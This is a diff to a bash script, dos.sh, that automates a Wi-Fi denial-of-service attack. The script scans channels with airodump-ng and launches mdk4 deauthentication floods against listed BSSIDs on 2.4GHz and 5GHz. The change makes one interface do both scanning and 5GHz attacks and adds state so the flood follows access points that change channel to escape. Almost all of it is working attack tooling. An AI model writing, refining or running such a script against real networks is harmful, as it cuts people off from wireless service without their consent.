@@ -1,37 +1,42 @@
 #!/bin/bash
 
-# Usage: sudo ./dos.sh <scan interface> <2GHz interface> <5GHz interface>
+# Usage: sudo ./dos.sh <scan interface/5GHz interface> <2GHz interface>
 
 # Use default values if no arguments are passed
-scan_if=${1:-"wlan0"}
+scan_d5_if=${1:-"wlan0"}
 d2_if=${2:-"wlan1"}
-d5_if=${3:-"wlan2"}
 log_file="dos_pursuit.log"
 channel_file="channel.txt"
 old_channel_file="old_channel.txt"
 
+was_5g_deauthing=0
+
 stop_monitor_mode() {
   # Check to see if all interfaces are in monitor mode, else put them in monitor mode
-  if iwconfig "$scan_if" | grep -q "Mode:Monitor" &&
-    iwconfig "$d5_if" | grep -q "Mode:Monitor" &&
+  if iwconfig "$scan_d5_if" | grep -q "Mode:Monitor" &&
     iwconfig "$d2_if" | grep -q "Mode:Monitor"; then
     echo "Putting all interfaces in managed mode"
-    airmon-ng stop "$scan_if"
-    airmon-ng stop "$d5_if"
+    airmon-ng stop "$scan_d5_if"
     airmon-ng stop "$d2_if"
   else
     echo "All interfaces are in managed mode"
   fi
 }
 
+stop_5_deauth() {
+  tmux select-pane -t 3
+  tmux send-keys -t 1 C-c
+}
+
 run_airodump() {
+
   echo "Scanning for channel change" >>"$log_file"
   # Remove the old files
   rm -f "dos_pm-01.csv"
   # Run airodump-ng in the tmux pane 1 for 30 seconds
-  airodump_command="airodump-ng -w ./dos_pm $scan_if -c 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52 --output-format csv"
+  airodump_command="airodump-ng -w ./dos_pm $scan_d5_if -c 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52 --output-format csv"
   tmux send-keys -t 1 "$airodump_command" Enter
-  sleep 30
+  sleep 15
   # Kill airodump-ng
   tmux send-keys -t 1 C-c
 }
@@ -41,7 +46,7 @@ process_capture() {
 
   # Extract the channel of bssids contained in bssids.txt from the capture file in the form <bssid> <channel>
   for bssid in $(cat "bssids.txt"); do
-    grep "$bssid" dos_pm-01.csv | head -n 1 | cut -d ',' -f1,4 | tr -d ' ' | tr ',' ' ' >> $channel_file
+    grep "$bssid" dos_pm-01.csv | head -n 1 | cut -d ',' -f1,4 | tr -d ' ' | tr ',' ' ' >>$channel_file
   done
 
 }
@@ -76,9 +81,12 @@ has_changed() {
 run_deauth_on_channel() {
   # Usage: run_deauth_on_channel <BSSID> <channel>
   if [ "$2" -gt 13 ]; then
-    echo "Starting 5GHz deauth on $1 @ $2" >>"$log_file"
+    if [ $was_5g_deauthing -eq 0 ]; then
+      echo "Starting 5GHz deauth on $1 @ $2" >>"$log_file"
+    fi
     tmux send-keys -t 3 C-c
-    mdk4_deauth "$d5_if" "$1" "$2" 3
+    mdk4_deauth "$scan_d5_if" "$1" "$2" 3
+    was_5g_deauthing=1
   else
     echo "Starting 2GHz deauth on $1 @ $2" >>"$log_file"
     tmux send-keys -t 2 C-c
@@ -102,6 +110,13 @@ check_restarts() {
       old=$(grep "$bssid" "$old_channel_file" | cut -d ' ' -f2)
       echo "Channel changed for $bssid: $old -> $channel" >>"$log_file"
       run_deauth_on_channel "$bssid" "$channel"
+    else
+      # If 5G was deauthing
+      if [ $was_5g_deauthing -eq 1 ] && [ "$channel" -gt 13 ]; then
+        run_deauth_on_channel "$bssid" "$channel"
+      else
+        was_5g_deauthing=0
+      fi
     fi
   done <"$channel_file"
 }
@@ -134,6 +149,7 @@ while true; do
   process_capture
   sleep 1
   check_restarts
+
   cp "$channel_file" "$old_channel_file"
   sleep 300
 done
